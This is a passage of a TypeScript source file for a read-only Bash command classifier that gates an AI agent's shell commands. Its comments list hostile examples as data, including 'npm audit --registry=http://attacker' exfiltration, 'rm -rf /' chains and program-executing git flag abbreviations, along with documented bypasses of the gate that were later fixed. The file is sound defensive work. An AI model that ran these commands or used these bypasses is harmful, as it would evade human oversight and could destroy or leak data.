// Read-only Bash command classifier, shared by two gates that must not
// fail-close on a command that mutates nothing: the understanding-gate
// PreToolUse blocker (allows a provably read-only Bash command without
// an approved report) and the Risk Classifier's read-only floor
// (classifies one as `low` instead of fail-closed unclassified). Lives
// in runtime/ so both the cli/pack hooks and the runtime classifier
// import it without a cli -> runtime layering inversion.
//
// The pack's hook matcher `Edit|Write|Bash` is too broad on its own:
// `Bash` covers commands like `git status`, `gh pr view`, `ls`, `cat`
// that mutate nothing. Hard-blocking them behind a full Understanding
// Report cycle trains the agent and operator to experience the gate
// as noise, which erodes its credibility on the writes that actually
// matter. A gate scoped exactly to what it must stop is a credible
// gate.
//
// Design contract:
// - The allowlist is intentionally conservative. Anything not on it
//   is treated as a write (block). Better to occasionally annoy a
//   read-only command we haven't enumerated than to let a write slip.
// - Any shell chaining (`;`, `&&`, `||`, `|`), redirection (`>`,
//   `>>`, `<`), or command substitution (backticks, `$()`) makes the
//   whole composition unclassifiable. Even if every individual piece
//   would be read-only, a chained or substituted command can hide
//   writes inside its construction. Refuse the whole thing.
// - `isReadOnlyBashPipeline` is a narrower exception used ONLY by the
//   understanding-gate PreToolUse hooks: it admits a single-`|` pipeline
//   when EVERY stage independently classifies read-only, while still
//   refusing `;`, `&` (and therefore `&&`, `|&`, background `&`), `||`,
//   redirection, and substitution. A pipeline whose every stage is on
//   the conservative read-only allowlist cannot write (writing needs a
//   write-bin, a redirect, or a substitution, all still refused), so
//   allowing it does not widen what the gate permits — it only stops the
//   gate from blocking a read-only poll like `gh pr checks 123 | head`.
//   `isReadOnlyBashCommand` itself stays strict (refuses all chaining)
//   for the Risk Classifier read-only floor and the solution-acceptance
//   write-guard, which must not treat any chaining as read-only.
// - The classifier never short-circuits write detection: if a command
//   is on the allowlist but a write indicator is also present, the
//   write indicator wins. The shell-metachar check above accomplishes
//   this without a separate write-binary deny list (the meta-chars
//   are how a write would be smuggled into a "read-only" command in
//   the first place).
// - Some bins are not admitted to the simple unconditional allowlist
//   because they can write via their own flags or operands without any
//   shell metacharacter. `find` is the canonical example (guarded by
//   `FIND_WRITE_FLAGS`). `sort`, `tree`, and `file` receive the same
//   per-bin write-flag guard: their read forms are classified read-only
//   when none of their write flags appear in the token list. `uniq`,
//   `date`, and `hostname` are excluded entirely because their write
//   vectors are positional operands or cluster-ambiguous flag chars
//   that cannot be detected cleanly (see `SIMPLE_READ_ONLY_BINS`).
//
// This module is the canonical home for the classification within
// harness. If the @lannguyensi/understanding-gate package adds a
// parallel classifier in the future, it should mirror this allowlist
// verbatim, not diverge.

import { decodeShellWord } from "./shell-word.js";
import {
  GIT_GLOBAL_NO_VALUE_FLAGS,
  GIT_GLOBAL_VALUE_TAKING_FLAGS,
  GIT_TOKEN_RE,
} from "./command-normalize.js";

/**
 * Single-token read-only binaries. Each accepts arguments without
 * changing classification: `ls -la /tmp` is still read-only.
 *
 * `cd` is included here even though it is a shell builtin, not an
 * external binary — same as `echo`/`true`/`false` already in this set,
 * the classifier only inspects argv tokens, not builtin-vs-binary
 * status. `cd` mutates only the invoking shell process's own working
 * directory; by construction it cannot write to the filesystem or
 * touch production, and unlike `find`/`sort`/`tree`/`file` it has no
 * flag whose value is an output path, so no per-bin write-flag guard is
 * needed. A chained or redirected form (`cd /x && rm -rf /`,
 * `cd $(evil)`) never reaches this set: the shell-metacharacter /
 * substitution guard in `isReadOnlyBashCommand` refuses the whole
 * string before tokenization, so only the bare navigation form (`cd`,
 * `cd -`, `cd DIR`, with or without `-L`/`-P`) is ever classified here.
 *
 * Deliberately EXCLUDED because their write vector is not a clean flag:
 *
 * `uniq`: a second positional operand is the output file. Detecting a
 * write requires positional-operand counting, which is out of scope for
 * a token-scan classifier.
 *
 * `date`: `-s` sets the system clock, but the `-s` character appears
 * inside getopt clusters shared with benign flags (`-Iseconds` is parsed
 * by GNU date as `-I FMT=seconds`, not `-I -s econds`). A char-in-
 * cluster check would produce false positives on read-only date forms,
 * and false negatives on combined forms like `-us`.
 *
 * `hostname`: `hostname NAME` sets the hostname via a positional operand,
 * not a flag. Detecting the write requires positional-operand counting.
 *
 * `sort`, `tree`, and `file` are NOT in this set but each gets a per-bin
 * write-flag guard below (like `find`): each has an enumerable set of
 * write/exec flags detectable by scanning tokens without counting
 * positional operands. The guard must cover EVERY write/exec vector, not
 * just output redirection: sort guards `-o` / `--output` (output),
 * `--compress-program` (runs an arbitrary program on spill files), and
 * `-T` / `--temporary-directory` (scratch write); tree guards `-o` /
 * `--output`; file guards `-C` / `--compile`.
 */
const SIMPLE_READ_ONLY_BINS: ReadonlySet<string> = new Set([
  "ls", "cat", "pwd", "which", "type",
  "grep", "rg", "wc",
  "head", "tail", "stat", "du", "df",
  "ps", "whoami", "id", "echo", "printenv",
  "true", "false", "uptime", "uname", "tty",
  "basename", "dirname", "realpath", "readlink",
  "less", "more", "cmp", "diff", "comm",
  "cut", "tr", "tac", "rev",
  "cd",
]);

/**
 * `find` flags that make `find` itself a write tool, regardless of
 * shell metacharacters. `find` is the one binary in the canonical
 * read-only set whose own arguments can mutate the filesystem
 * (`-delete`) or shell out to a write command (`-exec`, `-execdir`,
 * `-ok`, `-okdir`). It also has output-write flags (`-fprint`,
 * `-fprintf`, `-fprint0`, `-fls`) that would land outside any
 * redirection guard. Any of these tokens anywhere in the argv
 * forfeits the read-only classification, so `find` is treated as a
 * special case rather than included in `SIMPLE_READ_ONLY_BINS`.
 */
const FIND_WRITE_FLAGS: ReadonlySet<string> = new Set([
  "-delete",
  "-exec", "-execdir", "-ok", "-okdir",
  "-fprint", "-fprintf", "-fprint0", "-fls",
]);

/**
 * Command-runner binaries: their argv is itself a nested command to
 * execute, so the "each accepts arguments without changing
 * classification" rule does NOT hold for them. `command rm -rf /tmp/x`
 * runs `rm`, and `env FOO=bar rm -rf /tmp/x` runs `rm` too. Including
 * them in `SIMPLE_READ_ONLY_BINS` would classify the WRAPPER as
 * read-only while the wrapped command does the write, a hard gate
 * bypass. Each runner gets a `find`-style special case below that
 * strips the runner's own leading flags/assignments and recurse-
 * classifies the residual underlying command. Bare `env` /
 * `command` (no underlying command) stay read-only: they only print
 * the environment or resolve a name.
 *
 * `env` leading flags that take no command and do not change the fact
 * that what follows is still a command to run. `-i` / `--ignore-
 * environment` and `-u NAME` / `--unset=NAME` scrub the environment
 * but still execute the residual command; `-` is the historical
 * synonym for `-i`. `--` ends option parsing. We skip these (and any
 * `NAME=VALUE` assignment tokens) to find the real underlying command.
 *
 * Exported (F6 fix, review round 2026-07-27, run
 * 2026-07-27-gate-target-repo-resolution): `command-normalize.ts`'s
 * `peelEnv` used to hand-roll its own copy of this exact enumeration
 * ("that module's constants are private" — no longer true), and the two
 * copies had already drifted (see that module's header for the confirmed
 * divergence). Exporting the NAME sets here — not the parsing logic
 * itself — lets both callers share one source of truth for "which `env`
 * flags exist" while each keeps its own decision about what a match
 * means (this file only needs to skip past them; `command-normalize.ts`
 * additionally needs the VALUE of `-C`/`--chdir` to extract a target
 * directory, which stays local to that module). No behaviour change here.
 */
export const ENV_LEADING_FLAGS: ReadonlySet<string> = new Set([
  "-i", "--ignore-environment", "-", "--",
]);
/** `env` flags that consume the following token as their value. */
export const ENV_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-u", "--unset",
  "-C", "--chdir",
]);

/**
 * `env -S` / `--split-string` re-parses its single string argument
 * into a fresh argv, which defeats our whitespace tokenization: the
 * write would live inside one quoted token. Any appearance of the
 * split-string flag (bare, glued, or long-form) forfeits the
 * read-only classification. Fail closed.
 */
export const ENV_SPLIT_STRING_FLAGS = /^(-S.*|--split-string(=.*)?)$/;

/**
 * `less` and `more` can shell out via interactive `!cmd`. The agent
 * shell is non-interactive, so the escape is not reachable in
 * practice today; the entry stays in the simple-read-only set with
 * a documented caveat in case a future runtime PTYs the agent.
 */

/**
 * `git` subcommands whose NAME is a prerequisite for read-only
 * classification. Membership here is necessary but NOT sufficient:
 * several of these subcommands mutate once given arguments (task
 * 9d1fff1b, measured against real git 2.50.1), so `isReadOnlyGitInvocation`
 * below applies a per-subcommand argument-form check on top of this set.
 * A name not in this set is a write (block) unconditionally.
 *
 * `git config` is excluded: with arguments it can set values.
 */
const GIT_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  "status", "log", "diff", "show", "branch", "tag",
  "fetch", "remote", "ls-files", "ls-remote", "ls-tree",
  "rev-parse", "rev-list", "describe", "blame", "shortlog",
  "reflog", "cat-file", "check-ref-format", "for-each-ref",
  "name-rev", "merge-base", "show-ref",
]);

/**
 * Tokens that make ANY git invocation write or execute, independent of
 * the subcommand — so the check is applied globally, above the
 * per-subcommand switch (task 9d1fff1b, review round 1, all measured
 * against git 2.50.1):
 *
 *   - `--output=<path>` / `--output <path>` creates/truncates a file at
 *     OPTION-PARSE time (git's shared `diff_opt_parse` -> `xfopen`), not
 *     just in diff/log/show: measured writing a file on `git rev-list
 *     --output`, `git shortlog --output`, and `git blame --output` too,
 *     all of which are otherwise-read-only subcommands. Scoping the
 *     forfeit to a subcommand list would need re-auditing on every git
 *     version for which parsers reach that handler; a global forfeit
 *     does not, and no read-only git subcommand uses `--output` as a
 *     read flag. Detected on the exact long form ONLY (no abbreviation
 *     handling) — task 62fa0542 measured `--output` on git 2.50.1 and
 *     found the diff/log/show/rev-list/shortlog/blame option parser does
 *     NOT do GNU abbreviation matching for this flag at all: every prefix
 *     shorter than the full 8 characters (`--o`..`--outpu`) errored
 *     `invalid option` / `unrecognized argument` / `unknown option`
 *     WITHOUT writing the canary file, on every one of those subcommands.
 *     Adding an abbreviation arm here would only over-block (e.g.
 *     `--o` is not close to any other real flag, so no live over-block
 *     was found either) with no matching security benefit on this git
 *     version, so the exact-match stays as the measured-correct guard;
 *     re-measure if the guarded git version ever changes.
 *   - `--upload-pack` / `--exec` / `--receive-pack`, in ANY unambiguous
 *     GNU/BSD `getopt_long` abbreviation (task 62fa0542, real ACE bypass:
 *     `git ls-remote --upl=/prog .` resolves to `--upload-pack` and runs
 *     `/prog` — the exact-spelling-only guard that shipped in 9d1fff1b
 *     missed every abbreviated form). Each one runs an operator-named
 *     binary: measured `git fetch --upload-pack=<script> <local-repo>`
 *     and `git ls-remote --upload-pack=<script> <local-repo>` executing
 *     the script; `--receive-pack` is blocked defensively by analogy
 *     (transport-option sibling of `--upload-pack`/`--exec`, config- and
 *     version-dependent, not reachable on any subcommand in
 *     `GIT_READ_ONLY_SUBS` on the measured git 2.50.1 — same fail-closed
 *     posture as the `::` transport arm below). See `isLongOptionAbbreviation`
 *     call sites just below for the measured minimum prefix length and
 *     the per-flag measurement table in this module's git-guard tests.
 *   - a NON-flag positional containing `::` is the `ext::`/`fd::`
 *     transport-helper form, which runs a local program (protocol.ext
 *     defaults to `user`, i.e. allowed for a direct CLI call). Blocked
 *     defensively — it did not execute on the probe machine's git config,
 *     but the vector is config/version-dependent and cheap to close.
 *     Checked only on positionals so a `--format='%h::%s'` read stays
 *     read-only (the `::` is inside a flag, not a remote position).
 */
function isGitDangerousToken(raw: string): boolean {
  const hit = (t: string): boolean => {
    if (t === "--output" || t.startsWith("--output=")) return true;
    // `--upload-pack`: measured minimum unambiguous prefix is 1 character
    // past `--` (`--u`), on `git ls-remote` (git 2.50.1) — `ls-remote`'s
    // option table has no other `u`-prefixed flag, so `--u` resolves
    // unambiguously to `--upload-pack` there even though the SAME prefix
    // is ambiguous on `git fetch` (`--unshallow` / `--update-shallow`,
    // needs `--upl`, 3 chars past `--`, to disambiguate — re-measured
    // task 62fa0542 review round 1, correcting an off-by-one in the
    // original 4-chars claim: `git fetch --upl=<script> <repo>` already
    // attempts to exec the script; `--up` alone still errors ambiguous
    // against `--update-head-ok`/`--update-shallow`). Per the fail-closed rule
    // (a prefix unambiguous on ANY relevant subcommand is blocked
    // everywhere), the minimum of the two — 1 — is used globally. Known,
    // disclosed over-block cost at this minimum (measured, git 2.50.1):
    // `git status --u` (-> `--untracked-files`), `git ls-files --u`
    // (-> `--unmerged`), `git name-rev --u` (-> `--undefined`) are all
    // genuinely read-only real git behavior that this guard now blocks.
    if (isLongOptionAbbreviation(t, "--upload-pack", 1)) return true;
    // `--exec`: on `git ls-remote` (a hidden legacy alias for
    // `--upload-pack`, same execution vector, undocumented in `-h`), the
    // measured minimum unambiguous prefix is 3 characters past `--`
    // (`--exe`) — `--e` / `--ex` are ambiguous with `--exit-code` and
    // ERROR (do not execute). No read-only subcommand other than
    // `ls-remote` accepts `--exec` at all (measured against every name
    // in `GIT_READ_ONLY_SUBS`), and no other flag on any of those
    // subcommands starts with `exe`, so no over-block was found at this
    // minimum.
    if (isLongOptionAbbreviation(t, "--exec", 3)) return true;
    // `--receive-pack`: not accepted, at any prefix length, by any
    // subcommand in `GIT_READ_ONLY_SUBS` on the measured git 2.50.1 (it
    // is a `push`/`send-pack` option) — the exact spelling was already
    // blocked defensively pre-fix, so this is the same defense extended
    // to abbreviations, not a newly-reachable vector. Calibrated against
    // `git push` (a `send-pack` front end): measured minimum unambiguous
    // prefix is 4 characters past `--`, `--rece` — re-measured task
    // 62fa0542 review round 1, correcting an off-by-one in the original
    // 3-chars (`--rec`) claim: `git push --rec=<script> --dry-run <repo>
    // HEAD:x` errors `ambiguous option: rec (could be --recurse-submodules
    // or --receive-pack)`, while `--rece=<script> ...` already attempts to
    // read from the named script as the remote helper. At the corrected
    // minimum 4, there is no known over-block for this receive-pack arm:
    // `--rec` stays read-only not because we block it, but because on real
    // git it resolves to the unrelated, harmless `--recurse-submodules`
    // (below the minimum), so it errors naturally as an ambiguous option.
    if (isLongOptionAbbreviation(t, "--receive-pack", 4)) return true;
    if (!t.startsWith("-") && t.includes("::")) return true;
    return false;
  };
  // raw-OR-decoded (repo convention, task fdee7d0f): decoding can only
  // ADD a match, so a quoted `--"output"=x` / `ext"::"x` cannot slip past.
  return hit(raw) || hit(decodeShellWord(raw));
}

/**
 * Branch write flags that need NO positional operand (the positional
 * write forms — `git branch -D main`, `git branch newname` — are
 * already caught structurally by the "no non-flag operand" rule in
 * `isReadOnlyGitInvocation`). These glued/standalone forms mutate
 * config or descriptions of the CURRENT branch without a positional,
 * so the structural rule alone would miss them. Closed set from git's
 * branch(1) manual.
 *
 * EXACT spellings and short flags only. Every long-form entry also has
 * an unambiguous GNU `getopt_long` ABBREVIATION vector (task 62fa0542,
 * review round 1 fix on 2118d30: `git branch --unse` really unsets the
 * upstream, `GIT_EDITOR=... git branch --edi` really writes
 * `branch.<name>.description` and spawns the editor, `git branch
 * --set-upstream-t=other` really sets tracking — the exact-spelling-only
 * set below missed every one of these), closed by `isBranchWriteFlag`
 * below via `isLongOptionAbbreviation`, NOT by widening this set (which
 * only ever holds exact tokens).
 *
 * MEASUREMENT TABLE (git 2.50.1, `git branch <flag>` on a real repo,
 * ground truth = a created/measured artefact — a config write, an
 * editor invocation via `GIT_EDITOR`, a deleted/renamed/copied branch —
 * never the exit code alone; scratchpad/gitmeasure/repo, this run):
 *
 *   flag                 shortest unambiguous prefix    over-block
 *   --delete             --d               (1 char)     none found
 *   --move               --mo              (2 chars)    none found
 *   --copy               --cop             (3 chars)    none found
 *   --force              --forc            (4 chars)    none found
 *   --unset-upstream     --u               (1 char)      none found
 *   --edit-description   --e               (1 char)      none found
 *   --set-upstream-to    --set-upstream-   (13 chars,
 *                          NOTE the trailing hyphen is part of the
 *                          minimum: `--set-upstream` alone (12 chars,
 *                          no trailing `-`) is the deprecated exact
 *                          `--set-upstream` alias instead, already an
 *                          exact-match entry above; adding the `-`
 *                          disambiguates towards `-to`)   none found
 *
 * "none found" means: no OTHER long option on `git branch`'s option
 * table (`--verbose`, `--quiet`, `--track`, `--color`, `--contains`,
 * `--no-contains`, `--abbrev`, `--all`, `--omit-empty`, `--list`,
 * `--show-current`, `--create-reflog`, `--merged`, `--no-merged`,
 * `--column`, `--sort`, `--points-at`, `--ignore-case`,
 * `--recurse-submodules`, `--format`) shares a prefix with any of the
 * flags above at or past the measured minimum length, so none of these
 * abbreviation arms blocks a genuinely harmless `git branch` read form
 * (confirmed by direct measurement of each one, not by inspection
 * alone). Ambiguous shorter prefixes (`--m`, `--c`/`--co`, `--f`/`--fo`/
 * `--for`, `--s`/`--se`/`--set`/.../`--set-upstre`, `--n`/`--no`/`--no-`)
 * genuinely ERROR on real git (do not write) and are correctly left
 * unmatched below — `isLongOptionAbbreviation`'s gated minimum is what
 * keeps them unmatched.
 *
 * `--track` (`-t`) was also checked (task brief flagged it as a "?"):
 * bare `git branch --track` / `--track=direct` (no positional) is a
 * harmless no-op read (measured: lists branches, no config change);
 * the only way `--track` mutates is alongside a branch-name positional
 * (`git branch --track newname`), which the structural "no non-flag
 * operand" rule in `isReadOnlyGitInvocation` already blocks. No new
 * guard needed for `--track`.
 */
const BRANCH_WRITE_FLAGS: ReadonlySet<string> = new Set([
  "-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy",
  "-u", "--set-upstream-to", "--unset-upstream", "--edit-description",
  "--set-upstream", "-f", "--force",
]);

function isBranchWriteFlag(raw: string): boolean {
  const hit = (t: string): boolean => {
    if (BRANCH_WRITE_FLAGS.has(t)) return true;
    if (t.startsWith("--set-upstream-to=") || t.startsWith("--set-upstream=")) return true;
    // Unambiguous GNU abbreviations of each long-form write flag. See
    // the measurement table above for the minimum prefix length and
    // over-block audit for each. `isLongOptionAbbreviation` itself
    // strips any glued `=VALUE` before comparing, so this also covers
    // `--set-upstream-t=other`, `--del=`, etc.
    if (isLongOptionAbbreviation(t, "--delete", 1)) return true;
    if (isLongOptionAbbreviation(t, "--move", 2)) return true;
    if (isLongOptionAbbreviation(t, "--copy", 3)) return true;
    if (isLongOptionAbbreviation(t, "--force", 4)) return true;
    if (isLongOptionAbbreviation(t, "--unset-upstream", 1)) return true;
    if (isLongOptionAbbreviation(t, "--edit-description", 1)) return true;
    if (isLongOptionAbbreviation(t, "--set-upstream-to", 13)) return true;
    return false;
  };
  return hit(raw) || hit(decodeShellWord(raw));
}

/**
 * `git remote` verbs that read without writing. Positive allow-list:
 * `add`/`remove`/`rm`/`rename`/`set-url`/`set-head`/`set-branches`/
 * `prune`/`update` all mutate and are therefore simply absent, so a
 * future write verb this floor has not reasoned about fails closed.
 * `show` and `get-url` contact/print only; `-v`/`--verbose` (a leading
 * dash) is bare listing.
 */
const REMOTE_READ_ONLY_VERBS: ReadonlySet<string> = new Set(["show", "get-url"]);

/**
 * Per-subcommand argument-form check for a git subcommand whose NAME is
 * already in `GIT_READ_ONLY_SUBS`. Returns true only when the specific
 * argument form is provably read-only; anything else fails closed
 * (task 9d1fff1b). The design is POSITIVE per subcommand (enumerate the
 * read-only shapes) rather than a denylist of write shapes: a git
 * argument this floor has not reasoned about then over-blocks (annoying)
 * instead of laundering a write (unsafe) — the same choice the module
 * header states and the `npm audit` guard already makes.
 *
 * `args` is the token list AFTER the subcommand (i.e. `tokens.slice(2)`).
 */
function isReadOnlyGitInvocation(sub: string, args: readonly string[]): boolean {
  // Global write/exec vectors reachable from many subcommands' shared
  // option parser and transport layer (--output, --upload-pack, ext::,
  // ...). Checked first so they apply to EVERY read-only subcommand,
  // including the ones the switch below returns `true` for unconditionally.
  if (args.some(isGitDangerousToken)) return false;

  // End-of-options: everything after a bare `--` is an OPERAND, never a
  // flag, so fold it into the positional view. Without this, `git tag --
  // <name>` would read as an all-flag form. (git itself rejects a
  // dash-leading refname, so `git tag -- -x` errors rather than writing,
  // but the classifier should not depend on git's refname rules to stay
  // sound.)
  const ddIndex = args.indexOf("--");
  const flagScope = ddIndex === -1 ? args : args.slice(0, ddIndex);
  const operandTail = ddIndex === -1 ? [] : args.slice(ddIndex + 1);
  const isPositional = (t: string): boolean => !t.startsWith("-");
  const noPositional = (): boolean =>
    operandTail.length === 0 && flagScope.every((t) => !isPositional(t));

  switch (sub) {
    // Creating/deleting/moving a branch or tag ALWAYS takes a non-flag
    // operand (the branch/tag name), so "no non-flag operand" blocks
    // every positional write form structurally; the flag check adds the
    // few glued no-positional branch writes (--set-upstream-to=, etc.).
    // A bare `git branch` / `git tag` and pure-flag listings stay
    // read-only. `git tag` needs no flag denylist: every tag mutation
    // (create/delete/annotate) requires the tag-name operand.
    case "branch":
      return noPositional() && !flagScope.some(isBranchWriteFlag);
    case "tag":
      return noPositional();

    // `git remote`: bare, `-v`/flags, or the read-only verbs show/get-url.
    // Any other first non-flag token (add/set-url/prune/update/...) blocks.
    case "remote": {
      const verb = flagScope.find(isPositional) ?? operandTail[0];
      return verb === undefined || REMOTE_READ_ONLY_VERBS.has(verb);
    }

    // `git fetch`: bare or a single positional (a remote name or URL) is
    // floored read-only, matching the pre-existing fetch contract — it
    // writes remote-tracking refs, FETCH_HEAD, and auto-followed / `--tags`
    // tag refs, and `--prune` deletes remote-tracking refs; all of that is
    // consciously accepted here (measured, not "remote-tracking only" as an
    // earlier comment claimed). The escalation this task closes is the
    // arbitrary-LOCAL-ref write via a refspec: `git fetch <remote>
    // <src>:<localdst>` — a SECOND positional. So block on >=2 positionals.
    // (`--refmap` cannot carry a lone write: git dies "only meaningful with
    // command-line refspec(s)" without a positional refspec — measured.)
    // A single positional URL contains `:` (https://, git@host:) and is
    // correctly NOT blocked; the ext:: transport is caught by the global
    // danger check above. Separated flag values (`--depth 5`) inflate the
    // positional count and conservatively over-block; use `--depth=5`.
    case "fetch": {
      const positionalCount =
        flagScope.filter(isPositional).length + operandTail.length;
      return positionalCount <= 1;
    }

    // `git reflog`: the write verbs expire/delete/drop are always the
    // FIRST arg. Read-only iff bare, explicit `show`, or a flag-led form
    // (`git reflog -n 5`). A leading ref (`git reflog HEAD`, read-only)
    // is conservatively blocked — acceptable over-block. `--`-prefixed:
    // fall through to the operand so `git reflog -- expire` cannot pass.
    case "reflog": {
      const head = args[0] === "--" ? operandTail[0] : args[0];
      return head === undefined || head === "show" || head.startsWith("-");
    }

    // Every other subcommand in GIT_READ_ONLY_SUBS reads without a
    // ref/tree/index/config mutation for all argument forms (status,
    // ls-files, ls-remote, rev-parse, cat-file, ...). The two ways such a
    // subcommand could still write or execute — the shared `--output`
    // file handler and the `ext::`/`--upload-pack` transport execution —
    // are already forfeited by the global `isGitDangerousToken` check
    // above (measured on rev-list/shortlog/blame --output and ls-remote/
    // fetch upload-pack); config- and env-borne vectors (GIT_EXTERNAL_DIFF,
    // core.fsmonitor, protocol.ext.allow) are invisible to an argv
    // classifier and out of scope for this task.
    default:
      return true;
  }
}

/**
 * `gh` (GitHub CLI) noun + verb pairs that read state without writing.
 * `gh pr view`, `gh pr checks`, `gh run view`, `gh workflow list`, etc.
 */
const GH_READ_ONLY_VERBS: ReadonlySet<string> = new Set([
  "view", "list", "diff", "checks", "status",
]);
const GH_READ_ONLY_NOUNS: ReadonlySet<string> = new Set([
  "pr", "issue", "run", "workflow", "release",
  "repo", "label", "secret", "variable",
]);

/**
 * `harness` subcommands that only inspect manifest or harness state.
 * `harness preflight` and `harness approve` are excluded: preflight
 * writes a ledger row, approve writes the approval marker. Both are
 * legitimate, but if the gate is currently blocking, classifying them
 * as read-only would let them bypass it silently. Operator-approval
 * commands have their own escape path in `isEscapeCommand`.
 */
const HARNESS_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  "doctor", "validate", "audit", "diff", "list", "version",
  "show", "status", "pause",
]);

/**
 * `npm` subcommands that only inspect the installed tree, the registry,
 * or the lockfile without writing to `node_modules`, `package.json`,
 * `package-lock.json`, or the registry: `ls` / `list` (installed
 * dependency tree), `view` / `info` / `show` (registry metadata — `info`
 * and `show` are npm's own aliases for `view`), `outdated`, `why` /
 * `explain` (dependency-reason report — `explain` is `why`'s formal
 * name), `ping` (registry reachability check).
 *
 * Deliberately a curated ALLOWLIST, not a denylist of known-mutating
 * subcommands (`install`, `ci`, `publish`, `update`, `version`, ...): an
 * npm verb this floor has not been reasoned about — a new one in a
 * future npm release, or an existing one simply not enumerated here —
 * stays unclassified rather than being assumed safe, per the "unknown
 * is not safe" design contract.
 *
 * Only CANONICAL spellings are floored, not every alias npm accepts:
 * `la` / `ll` (aliases for `ls -la` / `ls -l`) and `v` (alias for `view`)
 * are deliberately NOT in this set. Widening to cover every alias is a
 * possible future extension, not required by this floor's goal (an
 * agent hitting one of those stays gated, not miscategorized as unsafe).
 *
 * `audit` is deliberately NOT in this set. `npm audit` alone (the
 * report) is read-only, but `npm audit fix` mutates the lockfile and
 * `node_modules`; a single subcommand membership test cannot
 * distinguish the two, so `audit` gets its own check in
 * `classifyTokens` instead of joining this allowlist.
 */
const NPM_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  "ls", "list", "view", "info", "show", "outdated", "why", "explain", "ping",
]);

/**
 * npm flags that redirect npm's network/config lookups to an
 * operator-unverified location: `--registry` (dependency/audit data is
 * sent to whatever host this names instead of the real registry) and
 * `--userconfig` / `--globalconfig` (loads npm config — which can itself
 * set `registry` — from an arbitrary file). Any of these on an otherwise
 * floored npm subcommand forfeits the read-only classification: `npm
 * audit --registry=http://attacker` would submit the full dependency
 * manifest to the named host, which is exfiltration, not a safe read.
 * Matches the glued (`--registry=URL`) and separate (`--registry URL`)
 * unscoped forms, and the PER-SCOPE registry override
 * (`--@scope:registry=URL` / `--@scope:registry URL`, e.g.
 * `--@myorg:registry=http://attacker`) via `NPM_REGISTRY_FLAG_RE` — npm
 * resolves a scoped package's registry from `@scope:registry` before the
 * plain `registry` config, so the scoped form is an equally live
 * exfiltration vector, not merely a naming variant. `--userconfig` /
 * `--globalconfig` have no per-scope form; npm has no short-flag spelling
 * for any of these three.
 *
 * HONEST LIMIT: this is a CLI-token guard only. It cannot see (and does
 * not attempt to close) `registry` set via `.npmrc` (project, user, or
 * global) or the `npm_config_registry` environment variable — both
 * redirect npm's registry lookups identically to `--registry` but leave
 * no trace in the argv this classifier inspects. Do not read this guard
 * as "npm's registry source is verified"; it only denies the on-the-spot
 * CLI override.
 *
 * Quoting bypass (task 2dfdf472, measured against bash's own quote
 * removal): the RAW-token-only shape below was defeated the same way
 * `FIND_WRITE_FLAGS` was — `npm audit --"registry"=http://evil`,
 * `--reg"istry"=`, `--"userconfig"=`, and the scoped `--"@myorg:registry"=`
 * spelling all decode to the real flag while none of the RAW tokens
 * matches `NPM_REGISTRY_FLAG_RE` or the untrusted-flag set, so the
 * unfixed guard let each one keep the read-only floor while npm actually
 * sent the dependency manifest to the attacker-named host. Every other
 * write/danger guard in this file already tests raw-OR-decoded
 * (`isOutputWriteToken`, `isSortWriteToken`, `isFileWriteToken`,
 * `FIND_WRITE_FLAGS`, `isGitDangerousToken`, `isBranchWriteFlag`,
 * `ENV_SPLIT_STRING_FLAGS`); this guard had not been brought into that
 * convention. Fixed the same way: decoding can only ADD a match, never
 * remove one, so testing raw OR decoded is monotone by construction.
 */
const NPM_REGISTRY_FLAG_RE = /^--(@[^:]+:)?registry(=|$)/;
const NPM_UNSCOPED_UNTRUSTED_FLAGS: ReadonlySet<string> = new Set([
  "--userconfig", "--globalconfig",
]);

function hasNpmUntrustedSourceFlag(tokens: readonly string[]): boolean {
  return tokens.some(
    (t) => checkNpmUntrustedSourceFlag(t) || checkNpmUntrustedSourceFlag(decodeShellWord(t)),
  );
}

function checkNpmUntrustedSourceFlag(t: string): boolean {
  return (
    NPM_REGISTRY_FLAG_RE.test(t) ||
    NPM_UNSCOPED_UNTRUSTED_FLAGS.has(t) ||
    [...NPM_UNSCOPED_UNTRUSTED_FLAGS].some((f) => t.startsWith(`${f}=`))
  );
}

/**
 * Common single-flag read-only invocations: `<bin> --version`,
 * `<bin> -v`, `<bin> --help`, `<bin> -h`. Token count must be 2 and
 * the second token must be one of these flags. Restricts to a
 * known-safe shape so a binary like `rm` cannot be smuggled past as
 * `rm --version`.
 */
const VERSION_OR_HELP_FLAGS: ReadonlySet<string> = new Set([
  "--version", "-V", "-v", "--help", "-h",
]);

/**
 * True when `trimmed` contains a shell chaining (`;`, `&`, `|`),
 * redirection (`<`, `>`), or command-substitution (backtick, `$(`)
 * metacharacter that could hide a write behind an otherwise-provable
 * read. Shared by `isReadOnlyBashCommand` and `isReadOnlyKubectlCommand`
 * below (extracted, task da823721, to keep their identical preamble
 * from being flagged as new copy-paste by the duplication gate). NOT
 * reused by `isReadOnlyBashPipeline`, which deliberately admits a bare
 * `|` (see its own doc comment) and so needs a narrower reject set.
 */
function hasUnsafeShellMetachar(trimmed: string): boolean {
  return (
    /[;&|<>]/.test(trimmed) ||
    trimmed.includes("\n") ||
    trimmed.includes("`") ||
    trimmed.includes("$(")
  );
}

/**
 * Classify a Bash command string. `true` means the command is
 * provably read-only and the understanding-gate can allow it without
 * an approved report. `false` means the command is either a write or
 * unclassifiable; the gate must block (fail-closed).
 *
 * The classifier inspects the command as a raw shell string. It does
 * NOT shell-parse or evaluate the command — that would introduce its
 * own attack surface. Instead it rejects any string that contains
 * shell metacharacters that could hide a write, then looks at the
 * first one or two tokens.
 */
export function isReadOnlyBashCommand(command: string): boolean {
  const trimmed = command.trim();
  if (trimmed === "") return false;

  // Reject any shell chaining, redirection, or command substitution.
  // These make the command unclassifiable even when every visible
  // piece would otherwise be read-only. Applied once to the whole
  // string, so it also covers any residual command a runner
  // (`env` / `command`) wraps: those are classified from the same
  // token slice, never from a re-read of the shell.
  if (hasUnsafeShellMetachar(trimmed)) return false;

  return classifyTokens(trimmed.split(/\s+/));
}

/**
 * Classify a Bash command that MAY be a `|` pipeline. `true` means every
 * stage is provably read-only, so the whole pipeline reads without
 * writing and the understanding-gate can allow it without an approved
 * report. This is the pipeline-aware companion to `isReadOnlyBashCommand`,
 * used ONLY by the understanding-gate PreToolUse hooks so a post-task
 * read-only poll like `gh pr checks 123 | head` is not blocked.
 *
 * Safety: a pipe between provably read-only stages authorizes no writes —
